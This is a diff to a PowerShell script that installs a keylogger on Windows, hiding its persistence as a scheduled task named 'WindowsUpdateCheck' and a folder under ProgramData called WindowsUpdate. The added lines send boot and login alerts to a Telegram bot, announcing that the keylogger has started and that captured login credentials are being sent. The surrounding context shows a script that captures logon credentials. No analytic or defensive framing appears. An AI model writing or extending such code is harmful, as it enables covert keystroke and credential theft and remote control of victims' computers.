@@ -107,6 +107,29 @@ Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $
 # Start it now in current user context
 Start-Process $pyw -ArgumentList $keyloggerPath -WindowStyle Hidden
 
+# Send system boot notification to Telegram
+$bootMessage = @"
+🔔 SYSTEM EVENT
+
+Computer: $env:COMPUTERNAME
+User: $env:USERNAME
+Event: SYSTEM_BOOT
+Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+
+✅ System BOOTED
+Status: Keylogger started
+Remote access: Available
+"@
+
+try {
+    $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
+    $body = @{
+        chat_id = $TelegramChatId
+        text = $bootMessage
+    }
+    Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing | Out-Null
+} catch {}
+
 # Create logon credential capture script
 $logonScriptPath = "C:\ProgramData\WindowsUpdate\logondata.ps1"
 $logonScript = @"
@@ -143,6 +166,27 @@ try {
 
 `$credsFile = "`$env:TEMP\login-`$env:COMPUTERNAME-`$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
 `$credsOutput | Out-File -FilePath `$credsFile -Encoding UTF8
+
+# Send immediate text notification
+`$loginAlert = @"
+🔔 USER LOGIN DETECTED
+
+Computer: `$env:COMPUTERNAME
+User: `$env:USERNAME
+Time: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+
+✅ User logged in
+Status: Credentials file being sent...
+"@
+
+try {
+    `$alertUri = "https://api.telegram.org/bot`$TelegramBotToken/sendMessage"
+    `$alertBody = @{
+        chat_id = `$TelegramChatId
+        text = `$loginAlert
+    }
+    Invoke-RestMethod -Uri `$alertUri -Method Post -Body `$alertBody -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing | Out-Null
+} catch {}
 
 Add-Type -AssemblyName System.Net.Http
 `$httpClient = New-Object System.Net.Http.HttpClient
